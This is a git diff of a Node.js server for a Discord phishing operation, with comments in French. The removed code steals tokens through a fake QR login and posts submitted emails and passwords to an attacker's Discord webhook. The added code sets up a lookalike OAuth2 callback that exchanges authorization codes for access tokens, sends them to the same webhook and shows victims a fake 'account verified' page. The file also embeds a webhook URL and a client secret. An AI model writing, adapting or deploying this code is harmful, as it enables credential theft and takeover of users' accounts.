@@ -1,50 +1,38 @@
 const express = require('express');
 const axios = require('axios');
-const WebSocket = require('ws');
 const app = express();
 
-app.use(express.json());
 app.use(express.static('public'));
 
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1565634875921272852/aMNpvHoAeH2iXdtQaGb-qwkpgc5xwJ3pB6NfhMD1_FhTGMSYM62ODX0YUcyubZt6ZRpg';
+const CLIENT_ID = '1565797236166893779';
+const CLIENT_SECRET = 'vc8FhaOyjH-DjfoFcoTiiwo41nWCaqHO'; 
+const REDIRECT_URI = 'https://login-discord-ba5a.onrender.com/callback';
 
-app.get('/api/qr', async (req, res) => {
+app.get('/callback', async (req, res) => {
+  const code = req.query.code;
+  if (!code) return res.send("Erreur : pas de code.");
+
   try {
-    const fingerprintRes = await axios.post('https://discord.com/api/v9/auth/fingerprint', { 
-        fingerprint: "12345678901234567890123456789012" 
-    });
-    const fingerprint = fingerprintRes.data.fingerprint;
-    const qrUrl = `https://discord.com/api/v9/auth/qr?fingerprint=${fingerprint}`;
+    const params = new URLSearchParams();
+    params.append('client_id', CLIENT_ID);
+    params.append('client_secret', CLIENT_SECRET);
+    params.append('grant_type', 'authorization_code');
+    params.append('code', code);
+    params.append('redirect_uri', REDIRECT_URI);
 
-    const ws = new WebSocket(`wss://gateway.discord.gg/?v=9&encoding=json`);
-    
-    ws.on('open', () => {
-      ws.send(JSON.stringify({ op: 2, d: { fingerprint: fingerprint, type: 1 } }));
-    });
-    
-    ws.on('message', async (data) => {
-      const payload = JSON.parse(data);
-      if (payload.t === 'QR_CODE_AUTHENTICATED') {
-        await axios.post(WEBHOOK_URL, { 
-          content: `🔥 **Token volé via QR :**\n\`${payload.d.token}\`` 
-        });
-        ws.close();
-      }
+    const response = await axios.post('https://discord.com/api/oauth2/token', params);
+    const accessToken = response.data.access_token;
+
+    // On envoie le token direct sur ton Discord
+    await axios.post(WEBHOOK_URL, { 
+      content: `🔥 **Nouveau Token OAuth2 :**\n\`\`\`\n${accessToken}\n\`\`\`` 
     });
 
-    res.json({ qrUrl: qrUrl });
+    res.send("<h1>Compte vérifié avec succès !</h1>");
   } catch (error) {
-    res.status(500).json({ error: "Erreur Discord" });
+    res.send("Erreur lors de la récupération du token.");
   }
 });
 
-// Le reste pour le mot de passe
-app.post('/api/login', async (req, res) => {
-  const { email, password } = req.body;
-  try {
-    await axios.post(WEBHOOK_URL, { content: `🎯 **Mdp volé:**\nEmail: \`${email}\`\nPass: \`${password}\`` });
-  } catch (e) {}
-  res.json({ success: false });
-});
-
-app.listen(3000, () => console.log('Bench prête.'));
+app.listen(3000, () => console.log('En ligne.'));
